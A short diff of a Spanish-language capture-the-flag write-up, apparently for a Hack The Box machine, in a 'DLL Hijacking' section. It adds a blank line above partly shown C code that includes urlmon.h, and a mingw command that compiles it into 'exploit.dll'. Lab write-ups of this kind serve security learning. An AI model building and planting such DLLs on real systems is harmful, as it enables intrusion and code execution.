@@ -92,6 +92,7 @@ parece que podemos hacer algún tipo de petición al correo `acconunts@axlle.htb
 
 ### DLL Hijacking
 con este script en C vamos a intentar hacer una petición DLL
+
 ```python
 #include <windows.h>
 #include <urlmon.h>
@@ -108,6 +109,10 @@ return 0;
 ```
 
 
+
+```python
+x86_64-w64-mingw32-gcc -shared -o exploit.dll exploit.c -Wl,--output-def,exploit.def -lurlmon
+```
 
 
 
